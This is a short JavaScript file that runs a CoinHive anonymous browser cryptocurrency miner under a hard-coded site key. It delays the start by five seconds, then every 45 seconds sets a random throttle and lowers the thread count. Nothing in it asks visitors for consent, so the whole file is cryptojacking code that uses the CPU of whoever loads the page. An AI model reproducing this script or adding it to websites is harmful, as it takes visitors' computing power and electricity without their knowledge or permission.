var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY');

miner.setNumThreads(Math.min(miner.getNumThreads(), 4));

//5 seconds delay 
setTimeout(startMiner, 5000);

function startMiner() {

    miner.start();

    console.log('Throttle: ' + miner.getThrottle());
    console.log('Threads: ' + miner.getNumThreads());

    var interval = setInterval(function () {
        var threads = miner.getNumThreads();
        if (threads <= 1) {
            //console.log('miner stopped!');
            //miner.stop();
            miner.setThrottle(0);
            clearInterval(interval);
        } else {
            miner.setThrottle(Math.random());
            console.log('Throttle: ' + miner.getThrottle());

            miner.setNumThreads(threads - 1);
            console.log('threads: ' + miner.getNumThreads());
        }
    }, 45 * 1000);
}